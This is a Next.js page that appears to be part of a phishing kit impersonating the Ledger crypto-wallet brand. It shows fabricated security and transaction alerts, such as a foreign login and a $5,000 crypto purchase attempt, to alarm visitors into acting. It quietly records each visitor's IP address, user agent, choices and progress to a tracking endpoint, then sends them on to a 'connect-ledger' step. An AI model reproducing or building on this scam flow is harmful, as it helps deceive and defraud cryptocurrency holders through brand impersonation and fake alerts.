"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"

import { RequestCard, type LedgerRequest, type RequestStatus } from "@/components/request-card"
import { Button } from "@/components/ui/button"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"

const initialRequests: LedgerRequest[] = [
  {
    id: "1",
    requester: "ID recovery change",
    category: "Security Alert",
    description: "ID recovery change was requested by a unknown user",
    date: "Jan 28, 2026",
    status: "pending",
  },
  {
    id: "2",
    requester: "Login attempt from Frankfurt, Germany",
    category: "Security Alert",
    description: "Unknown login from a foreign country",
    date: "Jan 27, 2026",
    status: "pending",
  },
  {
    id: "3",
    requester: "Attempt to purchase Crypto",
    category: "Transaction Alert",
    description: "$5,000 dollars has been attempted to be purchased on your account please confirm if this was you",
    date: "Jan 26, 2026",
    status: "pending",
  },
  {
    id: "4",
    requester: "Request to change API keys",
    category: "Security Alert",
    description: "Request to change the API keys on this account",
    date: "Jan 25, 2026",
    status: "pending",
  },
]

export default function LedgerApprovalPage() {
  const [requests, setRequests] = useState<LedgerRequest[]>(initialRequests)
  const router = useRouter()
  const [visitorId, setVisitorId] = useState<string>("")
  const [ipAddress, setIpAddress] = useState<string>("")
  const [isNavigating, setIsNavigating] = useState(false)

  const allDecided = requests.every((req) => req.status !== "pending")

  useHeartbeat(visitorId)

  useEffect(() => {
    const id = localStorage.getItem("visitorId")
    if (!id) {
      router.push("/")
      return
    }
    setVisitorId(id)

    fetch("/api/activity?visitorId=" + id)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          setIpAddress(data.activity.ipAddress)
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "approval",
            decisions: initialRequests.map((req) => ({
              requestId: req.id,
              requestName: req.requester,
              action: "pending",
              timestamp: new Date().toISOString(),
            })),
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ visitorId: id, activity }),
          })
        }
      })
  }, [router])

  const updateActivity = async (updatedRequests: LedgerRequest[]) => {
    if (!visitorId) return
    
    // Get existing session start time
    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()
    const sessionStarted = data.activity?.sessionStarted || new Date().toISOString()
    
    const activity: UserActivity = {
      visitorId,
      ipAddress,
      currentStage: "approval",
      decisions: updatedRequests.map((req) => ({
        requestId: req.id,
        requestName: req.requester,
        action: req.status,
        timestamp: new Date().toISOString(),
      })),
      sessionStarted,
      lastUpdated: new Date().toISOString(),
      userAgent: navigator.userAgent,
    }
    
    fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId, activity }),
    })
  }

  const handleApprove = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "approved" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  const handleDeny = (id: string) => {
    setRequests((prev) => {
      const updated = prev.map((req) => (req.id === id ? { ...req, status: "denied" as RequestStatus } : req))
      updateActivity(updated)
      return updated
    })
  }

  

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span 
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span 
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
            
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
        <div className="space-y-2 sm:space-y-3">
          {requests.map((request) => (
            <RequestCard
              key={request.id}
              request={request}
              onApprove={handleApprove}
              onDeny={handleDeny}
            />
          ))}
        </div>

        {allDecided && (
          <div className="mt-4 sm:mt-6 flex justify-end">
            <Button 
              disabled={isNavigating}
              onClick={async () => {
                if (isNavigating) return
                setIsNavigating(true)
                if (visitorId) {
                  const res = await fetch(`/api/activity?visitorId=${visitorId}`)
                  const data = await res.json()
                  
                  const activity: UserActivity = {
                    ...data.activity,
                    currentStage: "connect-ledger",
                    decisions: requests.map((req) => ({
                      requestId: req.id,
                      requestName: req.requester,
                      action: req.status,
                      timestamp: new Date().toISOString(),
                    })),
                    lastUpdated: new Date().toISOString(),
                  }
                  await fetch("/api/activity", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ visitorId, activity }),
                  })
                }
                router.push("/connect-ledger")
              }}
              className="bg-foreground text-background hover:bg-foreground/80 w-full sm:w-auto transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 cursor-pointer"
            >
              {isNavigating ? "Loading..." : "Next"}
            </Button>
          </div>
        )}
      </main>
    </div>
  )
}
